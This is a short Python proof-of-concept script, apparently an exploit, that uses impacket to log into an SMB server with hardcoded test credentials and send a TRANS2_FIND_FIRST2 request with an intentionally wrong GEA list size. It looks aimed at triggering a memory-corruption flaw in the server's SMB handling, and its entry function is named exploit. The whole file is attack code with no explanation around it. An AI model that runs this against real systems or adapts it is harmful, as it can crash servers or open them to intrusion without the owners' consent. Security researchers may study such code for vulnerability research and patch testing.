#!/usr/bin/python
from impacket import smb
from struct import pack
import os
import sys
import socket
import binascii

def send_trans2(conn, tid, setup, name, param, data):
    pkt = smb.NewSMBPacket()
    pkt['Tid']    = tid

    command = pack('<H', setup)

    transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2)
    transCommand['Parameters'] =smb. SMBTransaction2_Parameters()
    transCommand['Parameters']['MaxDataCount'] = len(data)
    transCommand['Data'] = smb.SMBTransaction2_Data()

    transCommand['Parameters']['Setup'] = command
    transCommand['Parameters']['TotalParameterCount'] = len(param)
    transCommand['Parameters']['TotalDataCount'] = len(data)

    if len(param) > 0:
        padLen = (4 - (32+2+28 + len(command)) % 4 ) % 4
        padBytes = '\xFF' * padLen
        transCommand['Data']['Pad1'] = padBytes
    else:
        transCommand['Data']['Pad1'] = ''
        padLen = 0

    transCommand['Parameters']['ParameterCount'] = len(param)
    transCommand['Parameters']['ParameterOffset'] = 32+2+28+len(command)+len(name) + padLen

    if len(data) > 0:
        pad2Len = (4 - (32+2+28 + len(command) + padLen + len(param)) % 4) % 4
        transCommand['Data']['Pad2'] = '\xFF' * pad2Len
    else:
        transCommand['Data']['Pad2'] = ''
        pad2Len = 0

    transCommand['Parameters']['DataCount'] = len(data)
    transCommand['Parameters']['DataOffset'] = transCommand['Parameters']['ParameterOffset'] + len(param) + pad2Len

    transCommand['Data']['Name'] = name
    transCommand['Data']['Trans_Parameters'] = param
    transCommand['Data']['Trans_Data'] = data
    pkt.addCommand(transCommand)

    conn.sendSMB(pkt)


def list_path(conn, tid, path, password = None):
    findFirstParameter = smb.SMBFindFirst2_Parameters()
    findFirstParameter['SearchAttributes'] = smb.SMB_FILE_ATTRIBUTE_DIRECTORY | smb.SMB_FILE_ATTRIBUTE_HIDDEN | \
                                             smb.SMB_FILE_ATTRIBUTE_SYSTEM | smb.SMB_FILE_ATTRIBUTE_READONLY | \
                                             smb.SMB_FILE_ATTRIBUTE_ARCHIVE
    findFirstParameter['SearchCount'] = 512
    findFirstParameter['Flags'] = smb.SMB_FIND_RETURN_RESUME_KEYS | smb.SMB_FIND_CLOSE_AT_EOS
    findFirstParameter['InformationLevel'] = 0x0003
    findFirstParameter['SearchStorageType'] = 0
    findFirstParameter['FileName'] = path +'\x00'
    geaList=pack('<L', 0x10007) # this size is wrong
    geaList+=(pack('<B', 0)+'\x00')*0x100
    send_trans2(conn, tid, smb.SMB.TRANS2_FIND_FIRST2, '\x00', findFirstParameter, geaList)
    files = [ ]

    totalDataCount = 1
    findData = ''
    findFirst2ParameterBlock = ''
    while len(findData) < totalDataCount:
        resp = conn.recvSMB()

        if resp.isValidAnswer(smb.SMB.SMB_COM_TRANSACTION2):
            trans2Response = smb.SMBCommand(resp['Data'][0])
            trans2Parameters = smb.SMBTransaction2Response_Parameters(trans2Response['Parameters'])
            totalDataCount = trans2Parameters['TotalDataCount']
            findFirst2ParameterBlock += trans2Response['Data'][trans2Parameters['ParameterOffset']-55:][:trans2Parameters['ParameterCount']]
            findData += trans2Response['Data'][trans2Parameters['DataOffset']-55:]

    findParameterBlock = smb.SMBFindFirst2Response_Parameters(findFirst2ParameterBlock)
    sid = findParameterBlock['SID']
    print sid
    return files




def exploit(target):
	conn = smb.SMB(target, target)
	conn.login_standard('pesante', '1234')

	tid = conn.tree_connect_andx('\\\\'+target+'\\'+'test')
	list_path(conn, tid, 'test')


TARGET=sys.argv[1]
exploit(TARGET)
print('done')
